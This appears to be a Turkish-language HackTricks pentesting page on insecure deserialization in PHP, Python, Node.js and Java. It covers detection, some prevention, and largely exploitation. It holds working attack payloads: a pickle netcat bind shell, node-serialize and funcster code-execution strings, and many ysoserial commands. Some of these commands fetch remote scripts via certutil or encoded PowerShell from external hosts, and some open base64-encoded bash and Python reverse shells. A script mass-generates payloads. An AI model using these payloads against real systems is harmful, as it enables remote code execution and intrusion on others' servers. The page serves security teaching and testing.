# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

**Serialization**, bir nesneyi saklanabilir bir formata dönüştürme yöntemi olarak anlaşılır; bu, nesneyi depolama veya bir iletişim sürecinin parçası olarak iletme amacı taşır. Bu teknik, nesnenin daha sonra yeniden oluşturulabilmesini sağlamak için yaygın olarak kullanılır ve yapısını ve durumunu korur.

**Deserialization** ise, tersine, serileştirmeyi etkisiz hale getiren bir süreçtir. Belirli bir formatta yapılandırılmış verileri almayı ve bunları tekrar bir nesne haline getirmeyi içerir.

Deserialization tehlikeli olabilir çünkü potansiyel olarak **saldırganların serileştirilmiş verileri manipüle ederek zararlı kod çalıştırmalarına** veya nesne yeniden yapılandırma sürecinde uygulamada beklenmedik davranışlar yaratmalarına olanak tanır.

## PHP

PHP'de, serileştirme ve deserialization süreçlerinde belirli sihirli yöntemler kullanılır:

- `__sleep`: Bir nesne serileştirildiğinde çağrılır. Bu yöntem, serileştirilmesi gereken nesnenin tüm özelliklerinin adlarının bir dizisini döndürmelidir. Genellikle bekleyen verileri taahhüt etmek veya benzer temizlik görevlerini yerine getirmek için kullanılır.
- `__wakeup`: Bir nesne deserialized edildiğinde çağrılır. Serileştirme sırasında kaybolmuş olabilecek veritabanı bağlantılarını yeniden kurmak ve diğer yeniden başlatma görevlerini yerine getirmek için kullanılır.
- `__unserialize`: Bu yöntem, bir nesne deserialized edilirken `__wakeup` yerine çağrılır (varsa). Deserialization süreci üzerinde `__wakeup`'a göre daha fazla kontrol sağlar.
- `__destruct`: Bu yöntem, bir nesne yok edilmek üzereyken veya script sona erdiğinde çağrılır. Genellikle dosya tanıtıcılarını veya veritabanı bağlantılarını kapatmak gibi temizlik görevleri için kullanılır.
- `__toString`: Bu yöntem, bir nesnenin bir string olarak muamele görmesini sağlar. Bir dosyayı okumak veya içindeki işlev çağrılarına dayalı diğer görevler için kullanılabilir ve nesnenin metinsel bir temsilini etkili bir şekilde sağlar.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Eğer sonuçlara bakarsanız, nesne serileştirildiğinde **`__wakeup`** ve **`__destruct`** fonksiyonlarının çağrıldığını görebilirsiniz. Birçok eğitimde **`__toString`** fonksiyonunun bazı özellikleri yazdırmaya çalışırken çağrıldığını göreceksiniz, ancak görünüşe göre bu **artık olmuyor**.

> [!WARNING]
> Eğer sınıfta uygulanmışsa, **`__unserialize(array $data)`** metodu **`__wakeup()`** yerine çağrılır. Bu, serileştirilmiş veriyi bir dizi olarak sağlayarak nesneyi serileştirmeye olanak tanır. Bu metodu, özellikleri serileştirmek ve serileştirme sırasında gerekli görevleri yerine getirmek için kullanabilirsiniz.
>
> ```php
> class MyClass {
>     private $property;
>
>     public function __unserialize(array $data): void {
>         $this->property = $data['property'];
>         // Serileştirme sırasında gerekli görevleri yerine getirin.
>     }
> }
> ```

Açıklamalı bir **PHP örneğini burada** okuyabilirsiniz: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), burada [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) veya burada [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Sınıfları

PHP otomatik yükleme işlevselliğini, keyfi php dosyalarını yüklemek ve daha fazlası için kötüye kullanabilirsiniz:

{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Referans Değerleri Serileştirme

Eğer bir nedenle bir değeri **başka bir serileştirilmiş değere referans olarak** serileştirmek isterseniz:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) PHP deserialization'larını kötüye kullanmak için payload'lar oluşturmanıza yardımcı olabilir.\
Uygulamanın kaynak kodunda bir deserialization'ı kötüye kullanmanın bir yolunu **bulamayabileceğinizi** unutmayın, ancak **harici PHP uzantılarının kodunu kötüye kullanabilirsiniz.**\
Bu nedenle, mümkünse, sunucunun `phpinfo()`'sunu kontrol edin ve **internette** (hatta **PHPGGC**'nin **gadgets**'lerinde) kötüye kullanabileceğiniz bazı olası gadget'ları arayın.

### phar:// metadata deserialization

Eğer sadece dosyayı okuyan ve içindeki php kodunu çalıştırmayan bir LFI bulduysanız, örneğin _**file_get_contents(), fopen(), file() veya file_exists(), md5_file(), filemtime() veya filesize()**_** gibi fonksiyonlar kullanarak.** **phar** protokolünü kullanarak bir **dosya** okurken meydana gelen bir **deserialization**'ı kötüye kullanmayı deneyebilirsiniz.\
Daha fazla bilgi için aşağıdaki gönderiyi okuyun:

{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

Nesne unpickle edildiğinde, \_\_\_reduce\_\_\_ fonksiyonu çalıştırılacaktır.\
Kötüye kullanıldığında, sunucu bir hata dönebilir.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
`print(base64.b64encode(pickle.dumps(P(),2)))` kullanarak python3 çalıştırıyorsanız python2 ile uyumlu bir nesne oluşturmayı deneyin.

**pickle jails**'dan kaçış hakkında daha fazla bilgi için kontrol edin:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

Aşağıdaki sayfa, **yamls** python kütüphanelerinde **güvensiz deserialization'ı kötüye kullanma** tekniğini sunmakta ve **Pickle, PyYAML, jsonpickle ve ruamel.yaml** için RCE deserialization yükü oluşturmak üzere kullanılabilecek bir araçla bitmektedir:

{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)

{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **PHP veya Python gibi "sihirli" fonksiyonlara** sahip değildir; bu fonksiyonlar sadece bir nesne oluşturmak için çalıştırılacaktır. Ancak, **doğrudan çağrılmadan** bile **sıklıkla kullanılan** bazı **fonksiyonlar** vardır, örneğin **`toString`**, **`valueOf`**, **`toJSON`**.\
Eğer bir deserialization'ı kötüye kullanıyorsanız, bu fonksiyonları **diğer kodları çalıştırmak için tehlikeye atabilirsiniz** (potansiyel olarak prototype pollution'ı kötüye kullanarak) ve çağrıldıklarında rastgele kod çalıştırabilirsiniz.

Bir fonksiyonu doğrudan çağırmadan **çağırmanın** başka bir **"sihirli" yolu**, **bir async fonksiyondan** (promise) dönen bir nesneyi **tehlikeye atmak** ile mümkündür. Çünkü, eğer o **dönüş nesnesini** **"then" adında bir fonksiyon türünde** **özelliğe** sahip başka bir **promise**'e **dönüştürürseniz**, başka bir promise tarafından döndürüldüğü için **çalıştırılacaktır**. _Daha fazla bilgi için_ [_**bu bağlantıyı**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _takip edin._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` ve `prototype` kirlenmesi

Bu tekniği öğrenmek istiyorsanız **aşağıdaki eğitime göz atın**:

{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Bu kütüphane fonksiyonları serileştirmeye olanak tanır. Örnek:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
**Serileştirilmiş nesne** şöyle görünecektir:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Örnekte, bir fonksiyon serileştirildiğinde `_$$ND_FUNC$$_` bayrağının serileştirilmiş nesneye eklendiğini görebilirsiniz.

`node-serialize/lib/serialize.js` dosyasında aynı bayrağı ve kodun bunu nasıl kullandığını bulabilirsiniz.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Son kod parçasında görebileceğiniz gibi, **eğer bayrak bulunursa** `eval` fonksiyonu kullanılarak fonksiyon serileştirilir, bu nedenle temelde **kullanıcı girişi `eval` fonksiyonu içinde kullanılmaktadır**.

Ancak, **sadece bir fonksiyonu serileştirmek** **onu çalıştırmaz**, çünkü kodun bir kısmının **`y.rce`'yi çağırması** gerekir ve bu oldukça **olasılık dışıdır**.\
Yine de, serileştirilmiş nesneyi **bazı parantezler ekleyerek** **değiştirerek**, nesne serileştirildiğinde serileştirilmiş fonksiyonun otomatik olarak çalışmasını sağlayabilirsiniz.\
Son kod parçasında **son parantezi** ve `unserialize` fonksiyonunun kodu nasıl otomatik olarak çalıştıracağını gözlemleyin:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Daha önce belirtildiği gibi, bu kütüphane `_$$ND_FUNC$$_` sonrasındaki kodu alacak ve **çalıştıracak** `eval` kullanarak. Bu nedenle, **otomatik olarak kod çalıştırmak** için **fonksiyon oluşturma** kısmını ve son parantezi **silip sadece bir JS tek satırı çalıştırabilirsiniz** aşağıdaki örnekteki gibi:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
Burada bu güvenlik açığını nasıl istismar edeceğinize dair **daha fazla bilgi** bulabilirsiniz.

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**'ın dikkate değer bir yönü, **standart yerleşik nesnelerin** erişilemezliğidir; bunlar erişilebilir kapsamın dışındadır. Bu kısıtlama, yerleşik nesneler üzerinde yöntem çağırmaya çalışan kodların çalıştırılmasını engeller ve `console.log()` veya `require(something)` gibi komutlar kullanıldığında `"ReferenceError: console is not defined"` gibi istisnalara yol açar.

Bu sınırlamaya rağmen, tüm standart yerleşik nesneler de dahil olmak üzere küresel bağlama tam erişimin geri kazanılması, belirli bir yaklaşım aracılığıyla mümkündür. Küresel bağlamı doğrudan kullanarak, bu kısıtlamayı aşmak mümkündür. Örneğin, aşağıdaki kod parçası kullanılarak erişim yeniden sağlanabilir:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Daha fazla bilgi için bu kaynağı okuyun**[ **source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript** paketi yalnızca serileştirme amaçları için tasarlanmıştır ve yerleşik bir deserialization yeteneği yoktur. Kullanıcılar, deserialization için kendi yöntemlerini uygulamaktan sorumludur. Serileştirilmiş verileri deserialization için resmi örnek, `eval`'in doğrudan kullanımını önermektedir:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Bu fonksiyon nesneleri deseralize etmek için kullanılıyorsa, **kolayca istismar edebilirsiniz**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Daha fazla bilgi için bu kaynağı okuyun**[ **](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo kütüphanesi

Aşağıdaki sayfalarda bu kütüphaneyi kötüye kullanarak rastgele komutları nasıl çalıştırabileceğinize dair bilgiler bulabilirsiniz:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Java'da, **deserialization geri çağırmaları deserialization süreci sırasında çalıştırılır**. Bu yürütme, bu geri çağırmaları tetikleyen kötü niyetli yükler oluşturan saldırganlar tarafından istismar edilebilir ve zararlı eylemlerin potansiyel olarak yürütülmesine yol açabilir.

### Parmak İzleri

#### Beyaz Kutu

Kod tabanında potansiyel seri hale getirme zafiyetlerini tanımlamak için şunları arayın:

- `Serializable` arayüzünü uygulayan sınıflar.
- `java.io.ObjectInputStream`, `readObject`, `readUnshare` fonksiyonlarının kullanımı.

Aşağıdakilere ekstra dikkat edin:

- Dış kullanıcılar tarafından tanımlanan parametrelerle kullanılan `XMLDecoder`.
- `XStream`'in `fromXML` metodu, özellikle XStream sürümü 1.46 veya daha düşükse, çünkü seri hale getirme sorunlarına duyarlıdır.
- `readObject` metodu ile birlikte kullanılan `ObjectInputStream`.
- `readObject`, `readObjectNodData`, `readResolve` veya `readExternal` gibi yöntemlerin uygulanması.
- `ObjectInputStream.readUnshared`.
- Genel `Serializable` kullanımı.

#### Siyah Kutu

Siyah kutu testi için, java seri hale getirilmiş nesnelerini belirten belirli **imzalar veya "Sihirli Baytlar"** arayın ( `ObjectInputStream`'den kaynaklanan):

- Onaltılık desen: `AC ED 00 05`.
- Base64 deseni: `rO0`.
- `Content-type` başlığı `application/x-java-serialized-object` olarak ayarlanmış HTTP yanıt başlıkları.
- Önceki sıkıştırmayı belirten onaltılık desen: `1F 8B 08 00`.
- Önceki sıkıştırmayı belirten Base64 deseni: `H4sIA`.
- `.faces` uzantısına sahip web dosyaları ve `faces.ViewState` parametresi. Bu desenleri bir web uygulamasında keşfetmek, [Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md) hakkında detaylı bir inceleme yapılmasını gerektirmelidir.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Zayıf olup olmadığını kontrol et

Eğer **Java Deserialized bir açığın nasıl çalıştığını öğrenmek istiyorsanız** [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md) ve [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md) belgelerine göz atmalısınız.

#### Beyaz Kutu Testi

Bilinen zayıflıkları olan herhangi bir uygulamanın kurulu olup olmadığını kontrol edebilirsiniz.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Tüm bilinen zayıf kütüphaneleri **kontrol etmeyi** deneyebilirsiniz ve [**Ysoserial**](https://github.com/frohoff/ysoserial) bunun için bir istismar sağlayabilir. Ya da [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json) üzerinde belirtilen kütüphaneleri kontrol edebilirsiniz.\
Ayrıca, olası istismar edilebilecek gadget zincirlerini aramak için [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) kullanabilirsiniz.\
**gadgetinspector**'ı çalıştırırken (inşa ettikten sonra) karşılaştığı tonlarca uyarı/hata umursamayın ve bitmesine izin verin. Tüm bulguları _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ altında yazacaktır. Lütfen, **gadgetinspector'ın bir istismar oluşturmayacağını ve yanlış pozitifler gösterebileceğini** unutmayın.

#### Kara Kutu Testi

Burp eklentisi [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) kullanarak **hangi kütüphanelerin mevcut olduğunu** (ve hatta sürümlerini) belirleyebilirsiniz. Bu bilgi ile, zayıflığı istismar etmek için **bir yük seçmek daha kolay olabilir**.\
[**GadgetProbe hakkında daha fazla bilgi için bunu okuyun.**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe, **`ObjectInputStream` deserialization**'larına odaklanmıştır.

Burp eklentisi [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) kullanarak **ysoserial ile istismar edilebilen zayıf kütüphaneleri** belirleyebilir ve **istismar** edebilirsiniz.\
[**Java Deserialization Scanner hakkında daha fazla bilgi için bunu okuyun.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner, **`ObjectInputStream`** deserialization'larına odaklanmıştır.

Ayrıca, **Burp** içinde **deserialization** zayıflıklarını **tespit etmek için** [**Freddy**](https://github.com/nccgroup/freddy) kullanabilirsiniz. Bu eklenti, **sadece `ObjectInputStream`** ile ilgili zayıflıkları değil, **Json** ve **Yml** deserialization kütüphanelerinden de zayıflıkları tespit edecektir. Aktif modda, bunları uyku veya DNS yükleri kullanarak doğrulamaya çalışacaktır.\
[**Freddy hakkında daha fazla bilgi burada bulabilirsiniz.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serileştirme Testi**

Her şey, sunucu tarafından kullanılan herhangi bir zayıf kütüphaneyi kontrol etmekle ilgili değildir. Bazen, **serileştirilmiş nesne içindeki verileri değiştirebilir ve bazı kontrolleri atlayabilirsiniz** (belki bir web uygulaması içinde size yönetici ayrıcalıkları verebilir).\
Bir web uygulamasına gönderilen bir java serileştirilmiş nesnesi bulursanız, **gönderilen serileştirme nesnesini daha okunabilir bir formatta yazdırmak için** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **kullanabilirsiniz**. Hangi verileri gönderdiğinizi bilmek, bunları değiştirmeyi ve bazı kontrolleri atlamayı daha kolay hale getirecektir.

### **İstismar**

#### **ysoserial**

Java deserialization'larını istismar etmek için ana araç [**ysoserial**](https://github.com/frohoff/ysoserial) ([**buradan indirin**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Ayrıca, karmaşık komutlar (örneğin, borular ile) kullanmanıza olanak tanıyacak [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) kullanmayı da düşünebilirsiniz.\
Bu aracın **`ObjectInputStream`** istismarına **odaklandığını** unutmayın.\
İnjeksyonun mümkün olup olmadığını test etmek için **RCE** yükünden önce **"URLDNS"** yükünü **kullanmayı** **başlatırım**. Her durumda, "URLDNS" yükünün çalışmadığını ancak başka bir RCE yükünün çalıştığını unutmayın.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
**java.lang.Runtime.exec()** için bir payload oluştururken, bir yürütmenin çıktısını yönlendirmek için ">" veya "|" gibi **özel karakterler** kullanamazsınız, komutları yürütmek için "$()" kullanamazsınız veya bir komuta **boşluklarla** ayrılmış **argümanlar** bile geçiremezsiniz ( `echo -n "hello world"` yapabilirsiniz ama `python2 -c 'print "Hello world"'` yapamazsınız). Payload'ı doğru bir şekilde kodlamak için [bu web sayfasını](http://www.jackson-t.ca/runtime-exec-payloads.html) kullanabilirsiniz.

Windows ve Linux için **tüm olası kod yürütme** payload'larını oluşturmak ve ardından bunları savunmasız web sayfasında test etmek için aşağıdaki scripti kullanmaktan çekinmeyin:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

**Daha fazla exploit oluşturmak için** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **ve ysoserial'i kullanabilirsiniz**. Bu aracın daha fazla bilgisi, aracın sunulduğu **konuşmanın slaytlarında** bulunmaktadır: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec), Java'daki farklı **Json** ve **Yml** serileştirme kütüphanelerini istismar etmek için yükler oluşturmak için kullanılabilir.\
Projeyi derlemek için `pom.xml` dosyasına bu **bağımlılıkları** **eklemem** gerekiyordu:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Maven'ı kurun** ve **projeyi derleyin**:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Bu Java JSON kütüphanesi hakkında daha fazla bilgi edinin: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratuvarlar

- Bazı ysoserial payload'larını test etmek istiyorsanız **bu web uygulamasını çalıştırabilirsiniz**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Neden

Java, çeşitli amaçlar için çok fazla serileştirme kullanır:

- **HTTP istekleri**: Serileştirme, parametrelerin, ViewState'in, çerezlerin vb. yönetiminde yaygın olarak kullanılmaktadır.
- **RMI (Uzak Yöntem Çağrısı)**: Tamamen serileştirmeye dayanan Java RMI protokolü, Java uygulamalarında uzak iletişim için bir köşe taşıdır.
- **HTTP üzerinden RMI**: Bu yöntem, tüm nesne iletişimleri için serileştirmeyi kullanan Java tabanlı kalın istemci web uygulamaları tarafından yaygın olarak kullanılmaktadır.
- **JMX (Java Yönetim Uzantıları)**: JMX, nesneleri ağ üzerinden iletmek için serileştirmeyi kullanır.
- **Özel Protokoller**: Java'da, standart uygulama, ham Java nesnelerinin iletimini içerir; bu, gelecek istismar örneklerinde gösterilecektir.

### Önleme

#### Geçici nesneler

`Serializable` arayüzünü uygulayan bir sınıf, serileştirilemeyecek herhangi bir nesneyi sınıf içinde `transient` olarak işaretleyebilir. Örneğin:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Serializable'ı Uygulaması Gereken Bir Sınıfın Serileştirilmesinden Kaçının

